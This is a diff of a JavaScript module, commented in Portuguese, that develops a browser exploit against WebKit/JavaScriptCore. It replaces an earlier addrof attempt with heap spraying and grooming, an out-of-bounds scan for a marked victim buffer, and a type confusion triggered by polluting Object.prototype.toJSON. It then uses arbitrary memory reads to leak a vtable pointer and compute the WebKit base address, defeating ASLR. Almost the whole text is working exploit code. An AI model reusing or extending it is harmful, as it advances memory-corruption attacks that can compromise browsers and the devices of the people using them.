@@ -1,210 +1,180 @@
-// js/script3/testArrayBufferVictimCrash.mjs (Modificado para tentativa de addrof DIRETA)
-import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
+// js/script3/testArrayBufferVictimCrash.mjs (Versão Combinada e Robusta)
+import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
 import {
     triggerOOB_primitive,
-    oob_array_buffer_real,
+    oob_read_absolute,
     oob_write_absolute,
-    clearOOBEnvironment
+    arb_read,
+    arb_write,
+    clearOOBEnvironment,
+    isOOBReady
 } from '../core_exploit.mjs';
-import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';
+import { OOB_CONFIG, JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-// Nome do módulo atualizado para refletir a tentativa de addrof
-export const FNAME_MODULE_V28 = "OriginalHeisenbug_Plus_Addrof_v1";
+export const FNAME_MODULE_V28 = "Combined_GroomAndLeak_v1";
 
-const CRITICAL_OOB_WRITE_VALUE  = 0xFFFFFFFF;
-const VICTIM_AB_SIZE = 64;
+// --- Constantes para o Exploit ---
+const HEAP_SPRAY_COUNT = 512; // Número de objetos para o heap spray
+const VICTIM_AB_SIZE = 64;    // Tamanho do nosso ArrayBuffer vítima
+const OOB_SCAN_RANGE = 4096;  // Quantos bytes escanear além do nosso buffer OOB
 
-// Variáveis globais do script original
-let toJSON_call_details_v28 = null;
+// Valor mágico para identificar nosso vítima no heap
+const VICTIM_MAGIC_LOW = 0xCAFE0000;
+const VICTIM_MAGIC_HIGH = 0x13370000;
+const VICTIM_MAGIC_QWORD = new AdvancedInt64(VICTIM_MAGIC_LOW, VICTIM_MAGIC_HIGH);
 
-// NOVA LÓGICA PARA ADDROF: Objeto cujo endereço queremos vazar.
-// Será acessível dentro da sonda toJSON através de uma variável de escopo mais amplo se necessário,
-// ou definido no escopo de executeArrayBufferVictimCrashTest e acessado pela sonda.
-// Para simplificar, vamos definir no escopo de executeArrayBufferVictimCrashTest e criar uma
-// referência global temporária para a sonda usar.
-let object_to_leak_for_addrof_attempt = null;
+// Alvo da corrupção para acionar a Heisenbug
+const HEISENBUG_TRIGGER_OFFSET = 0x7C;
+const HEISENBUG_TRIGGER_VALUE = 0xFFFFFFFF;
 
+// Variável global para a sonda toJSON
+let toJSON_call_details = null;
 
-// toJSON Ultra-Minimalista do seu script original, AGORA COM A TENTATIVA DE ESCRITA PARA ADDROF
-function toJSON_V28_MinimalProbe_With_AddrofAttempt() {
-    // Estrutura original para toJSON_call_details_v28
-    toJSON_call_details_v28 = {
-        probe_variant: "V28_Probe_With_Addrof", // Nome da sonda atualizado
-        this_type_in_toJSON: "N/A_before_call",
-        error_in_toJSON: null,
-        probe_called: false // Importante para o log
+// Sonda toJSON para acionar a confusão de tipos
+function HeisenbugProbe() {
+    toJSON_call_details = {
+        probe_called: true,
+        this_type_in_toJSON: Object.prototype.toString.call(this)
     };
-
-    try {
-        toJSON_call_details_v28.probe_called = true;
-        toJSON_call_details_v28.this_type_in_toJSON = Object.prototype.toString.call(this);
-        logS3(`[toJSON_Probe_With_Addrof] 'this' é o objeto vítima. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "leak");
-
-        // MODIFICADO PARA ADDROF: Se a Heisenbug ocorrer...
-        if (this === victim_ab_ref_for_original_test && toJSON_call_details_v28.this_type_in_toJSON === '[object Object]') {
-            logS3(`[toJSON_Probe_With_Addrof] HEISENBUG CONFIRMADA! Tentando escrever object_to_leak_for_addrof_attempt em this[0]...`, "vuln");
-            if (object_to_leak_for_addrof_attempt) {
-                this[0] = object_to_leak_for_addrof_attempt; // A escrita crucial!
-                logS3(`[toJSON_Probe_With_Addrof] Escrita de referência em this[0] (supostamente) realizada.`, "info");
-            } else {
-                logS3(`[toJSON_Probe_With_Addrof] object_to_leak_for_addrof_attempt é null. Escrita não tentada.`, "warn");
-            }
-        } else if (this === victim_ab_ref_for_original_test) {
-            logS3(`[toJSON_Probe_With_Addrof] Heisenbug NÃO confirmada. Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "warn");
-        }
-
-    } catch (e) {
-        toJSON_call_details_v28.error_in_toJSON = `${e.name}: ${e.message}`;
-        logS3(`[toJSON_Probe_With_Addrof] ERRO na sonda: ${e.name} - ${e.message}`, "error");
-    }
-    // Retorno original da sua sonda
-    return { minimal_probe_executed: true };
+    return { probe_executed: true };
 }
 
-// Variável para manter a referência ao victim_ab para a sonda
-let victim_ab_ref_for_original_test = null;
+// --- Função Principal do Exploit ---
 
 export async function executeArrayBufferVictimCrashTest() {
-    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: Heisenbug Estável e Tentativa de Addrof ---`, "test", FNAME_CURRENT_TEST);
+    const FNAME_CURRENT_TEST = FNAME_MODULE_V28;
+    logS3(`--- INICIANDO TESTE COMBINADO: ${FNAME_CURRENT_TEST} ---`, "test");
     document.title = `${FNAME_MODULE_V28} Inic...`;
 
-    // Resetar detalhes da sonda
-    toJSON_call_details_v28 = null;
-    victim_ab_ref_for_original_test = null; // Resetar referência
-    // NOVA LÓGICA PARA ADDROF: Definir o objeto alvo aqui
-    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject" }; // Objeto simples
-
-    let errorCapturedMain = null;
-    let stringifyOutput = null;
-    // let potentiallyCrashed = true; // Não vamos mais assumir crash, focaremos no addrof
-    
-    // NOVA LÓGICA PARA ADDROF: Estrutura para resultado do addrof
-    let addrof_result = {
-        success: false,
-        leaked_address_as_double: null,
-        leaked_address_as_int64: null,
-        message: "Addrof não tentado ou Heisenbug não ocorreu."
-    };
-    
-    // Alvo da corrupção que funcionou no seu log original [22:49:03]
-    const corruptionTargetOffsetInOOBAB = 0x7C;
+    // Resetar estado
+    toJSON_call_details = null;
+    let victim_ab_addr = null;
+    let webkit_base_addr = null;
 
     try {
-        // PASSO 0: Configurar OOB (como no seu script original)
-        // lastStep = "oob_setup"; // (Removido lastStep para simplificar)
-        await triggerOOB_primitive({ force_reinit: true }); // Forçar re-init para consistência
-        if (!oob_array_buffer_real) { throw new Error("OOB Init falhou."); }
-        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);
-        logS3(`   Alvo da corrupção OOB em oob_array_buffer_real: ${toHex(corruptionTargetOffsetInOOBAB)}`, "info", FNAME_CURRENT_TEST);
-
-        // PASSO 1: Escrita OOB CRÍTICA (como no seu script original)
-        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
-        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
-        logS3(`  Escrita OOB crítica em ${toHex(corruptionTargetOffsetInOOBAB)} realizada.`, "info", FNAME_CURRENT_TEST);
+        // ======================================================================================
+        // FASE 1: PREPARAÇÃO DO HEAP (HEAP GROOMING) E LOCALIZAÇÃO DO VÍTIMA
+        // ======================================================================================
+        logS3("FASE 1: Preparando o Heap e procurando o endereço do 'victim_ab'...", "info");
         
-        await PAUSE_S3(100); 
+        // Criamos um grande array para o nosso spray
+        let heap_spray = new Array(HEAP_SPRAY_COUNT);
+        
+        // Preenchemos com objetos vítima, cada um marcado com um valor mágico
+        logS3(`  Alocando ${HEAP_SPRAY_COUNT} objetos 'vítima' marcados...`);
+        for (let i = 0; i < HEAP_SPRAY_COUNT; i++) {
+            let buf = new ArrayBuffer(VICTIM_AB_SIZE);
+            let view = new BigUint64Array(buf);
+            view[0] = VICTIM_MAGIC_QWORD.toBigInt(); // Marca o início do buffer
+            heap_spray[i] = { buf: buf, view: view }; // Manter referência
+        }
 
-        // PASSO 2: Criar victim_ab e Float64Array view sobre ele
-        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE); // Usar a variável global para a sonda
-        let float64_view_on_victim = new Float64Array(victim_ab_ref_for_original_test);
-        float64_view_on_victim.fill(0.123456789101112); // Preencher com um padrão único
+        // Criamos "buracos" no heap para aumentar a chance de alocação adjacente
+        for (let i = 0; i < HEAP_SPRAY_COUNT; i += 2) {
+            heap_spray[i] = null;
+        }
 
-        logS3(`PASSO 2: victim_ab (tamanho ${VICTIM_AB_SIZE} bytes) criado. View preenchida com ${float64_view_on_victim[0]}. Tentando JSON.stringify com ${toJSON_V28_MinimalProbe_With_AddrofAttempt.name}...`, "test", FNAME_CURRENT_TEST);
+        // Agora alocamos nossos objetos de exploit, esperando que caiam em um "buraco"
+        await triggerOOB_primitive({ force_reinit: true });
+        if (!isOOBReady()) throw new Error("Falha ao inicializar o ambiente OOB.");
+        const victim_ab = new ArrayBuffer(VICTIM_AB_SIZE);
+        
+        // Agora, usamos a leitura OOB para encontrar um de nossos vítimas
+        logS3("  Procurando pelo 'vítima' adjacente usando leitura OOB...");
+        for (let i = 0; i < OOB_SCAN_RANGE; i += 8) {
+            const current_offset = OOB_CONFIG.ALLOCATION_SIZE + i;
+            const potential_magic = await oob_read_absolute(current_offset, 8);
+            
+            if (isAdvancedInt64Object(potential_magic) && potential_magic.equals(VICTIM_MAGIC_QWORD)) {
+                // Encontramos o DADO do vítima. O objeto JSCell começa um pouco antes.
+                // Esta é uma suposição, pode precisar de ajuste. Assumimos que o objeto está 16 bytes antes dos dados.
+                victim_ab_addr = new AdvancedInt64(current_offset).sub(16);
+                victim_ab_addr = victim_ab_addr.add(OOB_CONFIG.BASE_OFFSET_IN_DV); // Ajuste com base na configuração
+                logS3(`  VÍTIMA ENCONTRADO! Endereço estimado do objeto: ${victim_ab_addr.toString(true)}`, "good");
+                break;
+            }
+        }
+
+        if (!victim_ab_addr) {
+            throw new Error("Falha ao encontrar o endereço do 'victim_ab'. O Heap Grooming pode ter falhado.");
+        }
+
+        // ======================================================================================
+        // FASE 2: ANÁLISE "ANTES" E "DEPOIS" DA CONFUSÃO DE TIPOS
+        // ======================================================================================
+        logS3("FASE 2: Analisando a memória do 'victim_ab' com arb_read...", "info");
+
+        // Dump "ANTES"
+        logS3("  Dump de memória ANTES da confusão de tipos:", "info");
+        const memory_before = await arb_read(victim_ab_addr, 64); // Lê 64 bytes
+        logS3(`    [${victim_ab_addr.toString(true)}] DUMP: ${memory_before.toString(true)}...`, "leak");
+
+        // Acionar a Heisenbug
+        logS3("  Acionando a Heisenbug (confusão de tipos)...", "warn");
+        oob_write_absolute(HEISENBUG_TRIGGER_OFFSET, HEISENBUG_TRIGGER_VALUE, 4);
         
         const ppKey = 'toJSON';
         let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
-        let pollutionApplied = false;
+        Object.defineProperty(Object.prototype, ppKey, {
+            value: HeisenbugProbe,
+            writable: true, configurable: true, enumerable: false
+        });
+        JSON.stringify(victim_ab);
+        Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor); // Limpar
 
-        try {
-            Object.defineProperty(Object.prototype, ppKey, {
-                value: toJSON_V28_MinimalProbe_With_AddrofAttempt, // Usar a sonda modificada
-                writable: true, configurable: true, enumerable: false
-            });
-            pollutionApplied = true;
-            logS3(`  Object.prototype.${ppKey} poluído com ${toJSON_V28_MinimalProbe_With_AddrofAttempt.name}.`, "info", FNAME_CURRENT_TEST);
-
-            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)... (Ponto esperado da Heisenbug e escrita para addrof)`, "warn", FNAME_CURRENT_TEST);
-            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test); 
-            // potentiallyCrashed = false; // Removido
-            
-            logS3(`  JSON.stringify(victim_ab_ref_for_original_test) completou. Resultado (da sonda): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
-            // Detalhes agora são preenchidos pela própria sonda em toJSON_call_details_v28
-            logS3(`  Detalhes da sonda (toJSON_call_details_v28): ${toJSON_call_details_v28 ? JSON.stringify(toJSON_call_details_v28) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);
-
-            // Verificar se a Heisenbug ocorreu (baseado no que a sonda preencheu em toJSON_call_details_v28)
-            if (toJSON_call_details_v28 && toJSON_call_details_v28.probe_called && toJSON_call_details_v28.this_type_in_toJSON === "[object Object]") {
-                logS3(`  HEISENBUG CONFIRMADA (fora da sonda, via toJSON_call_details_v28)! Tipo de 'this': ${toJSON_call_details_v28.this_type_in_toJSON}`, "vuln", FNAME_CURRENT_TEST);
-                
-                // NOVA LÓGICA PARA ADDROF: Ler do buffer após a tentativa de escrita na sonda
-                logS3("PASSO 3: Verificando float64_view_on_victim[0] APÓS Heisenbug e tentativa de escrita na sonda...", "warn", FNAME_CURRENT_TEST);
-                const value_read_as_double = float64_view_on_victim[0];
-                addrof_result.leaked_address_as_double = value_read_as_double;
-                logS3(`  Valor lido de float64_view_on_victim[0]: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);
-
-                const double_buffer_for_conversion = new ArrayBuffer(8);
-                const double_view_for_conversion = new Float64Array(double_buffer_for_conversion);
-                const int32_view_for_double_conversion = new Uint32Array(double_buffer_for_conversion);
-                double_view_for_conversion[0] = value_read_as_double;
-                addrof_result.leaked_address_as_int64 = new AdvancedInt64(int32_view_for_double_conversion[0], int32_view_for_double_conversion[1]);
-                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
-
-                if (value_read_as_double !== 0 && value_read_as_double !== 0.123456789101112 && // Não é zero nem o preenchimento
-                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
-                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
-                    addrof_result.success = true;
-                    addrof_result.message = "Heisenbug confirmada E leitura de double sugere um ponteiro.";
-                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
-                } else {
-                    addrof_result.message = "Heisenbug confirmada, mas valor lido de float64_view_on_victim[0] não parece ponteiro ou buffer não foi alterado.";
-                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
-                    document.title = `${FNAME_MODULE_V28}: Heisenbug OK, Addr Falhou`;
-                }
-            } else {
-                let msg = "Heisenbug (this como [object Object]) não foi confirmada via toJSON_call_details_v28.";
-                if(toJSON_call_details_v28) msg += ` Tipo obs: ${toJSON_call_details_v28.this_type_in_toJSON}`;
-                addrof_result.message = msg;
-                logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
-                document.title = `${FNAME_MODULE_V28}: Heisenbug Falhou`;
-            }
-
-        } catch (e_str) {
-            errorCapturedMain = e_str;
-            logS3(`   ERRO CRÍTICO durante JSON.stringify ou lógica de addrof: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
-            document.title = `${FNAME_MODULE_V28}: Stringify/Addrof ERR`;
-            addrof_result.message = `Erro na execução principal: ${e_str.name} - ${e_str.message}`;
-        } finally {
-            if (pollutionApplied) {
-                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
-                else delete Object.prototype[ppKey];
-            }
+        if (!toJSON_call_details || toJSON_call_details.this_type_in_toJSON !== '[object Object]') {
+            throw new Error("A confusão de tipos não foi acionada com sucesso.");
         }
+        logS3("  Confusão de tipos acionada com sucesso!", "good");
 
-    } catch (e_outer_main) {
-        errorCapturedMain = e_outer_main;
-        logS3(`ERRO CRÍTICO GERAL no teste: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
-        if (e_outer_main.stack) logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST);
-        document.title = `${FNAME_MODULE_V28} FALHOU CRITICAMENTE`;
-        addrof_result.message = `Erro geral no teste: ${e_outer_main.name}`;
+        // Dump "DEPOIS"
+        logS3("  Dump de memória DEPOIS da confusão de tipos:", "info");
+        const memory_after = await arb_read(victim_ab_addr, 64);
+        logS3(`    [${victim_ab_addr.toString(true)}] DUMP: ${memory_after.toString(true)}...`, "leak");
+
+        // ======================================================================================
+        // FASE 3: VAZAMENTO DE PONTEIRO E CÁLCULO DO ENDEREÇO BASE
+        // ======================================================================================
+        logS3("FASE 3: Procurando por ponteiros vazados e calculando o endereço base...", "info");
+        
+        // A primeira QWORD (8 bytes) de um JSCell é seu cabeçalho, que contém o ponteiro para a Structure.
+        // Vamos verificar se este ponteiro mudou para algo que pareça um ponteiro de vtable.
+        const structure_ptr_before = new AdvancedInt64(memory_before.low(), memory_before.high());
+        const structure_ptr_after = new AdvancedInt64(memory_after.low(), memory_after.high());
+        
+        logS3(`  Structure Pointer ANTES:  ${structure_ptr_before.toString(true)}`, "leak");
+        logS3(`  Structure Pointer DEPOIS: ${structure_ptr_after.toString(true)}`, "leak");
+
+        if (structure_ptr_after.equals(structure_ptr_before)) {
+            throw new Error("O ponteiro da Structure não mudou. A estratégia de vazamento falhou.");
+        }
+        
+        // Assumimos que o novo ponteiro é para uma VTable. Vamos ler seu primeiro ponteiro de função.
+        const leaked_vtable_ptr = structure_ptr_after;
+        logS3(`  Ponteiro de VTable vazado: ${leaked_vtable_ptr.toString(true)}`, "good");
+        
+        const leaked_func_ptr = await arb_read(leaked_vtable_ptr, 8);
+        logS3(`  Ponteiro de Função vazado (da VTable): ${leaked_func_ptr.toString(true)}`, "vuln");
+        
+        // Agora, calculamos o endereço base. Usaremos o offset de JSC::JSObject::put, que é
+        // um candidato comum para a primeira entrada de uma vtable de objeto.
+        const put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
+        if (!put_offset_str) throw new Error("Offset para 'JSC::JSObject::put' não encontrado em config.mjs.");
+
+        const put_offset = new AdvancedInt64(put_offset_str);
+        webkit_base_addr = leaked_func_ptr.sub(put_offset);
+
+        logS3(`  Offset de 'JSC::JSObject::put': ${put_offset.toString(true)}`, "info");
+        logS3(`  !!!! ENDEREÇO BASE DA WEBKIT ENCONTRADO !!!! -> ${webkit_base_addr.toString(true)}`, "vuln");
+        document.title = `WebKit Base: ${webkit_base_addr.toString(true)}`;
+        
+    } catch (e) {
+        logS3(`ERRO CRÍTICO NO EXPLOIT: ${e.message}`, "critical");
+        if(e.stack) logS3(e.stack, "critical");
+        document.title = `${FNAME_MODULE_V28} FALHOU`;
     } finally {
         clearOOBEnvironment();
-        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
-        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
-        if(addrof_result.leaked_address_as_int64){
-            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
-        }
-         // Limpar referências globais
-        object_to_leak_for_addrof_attempt = null;
-        victim_ab_ref_for_original_test = null;
+        logS3(`--- ${FNAME_CURRENT_TEST} CONCLUÍDO ---`, "test");
     }
-    // Manter a estrutura de retorno compatível com o que runHeisenbugReproStrategy_ABVictim espera,
-    // mas adicionando os detalhes do addrof.
-    return { 
-        errorOccurred: errorCapturedMain, 
-        potentiallyCrashed: false, // Se chegamos aqui, não crashou silenciosamente.
-        stringifyResult: stringifyOutput, 
-        toJSON_details: toJSON_call_details_v28, // Usar a variável global que a sonda preenche
-        addrof_attempt_result: addrof_result
-    };
 }
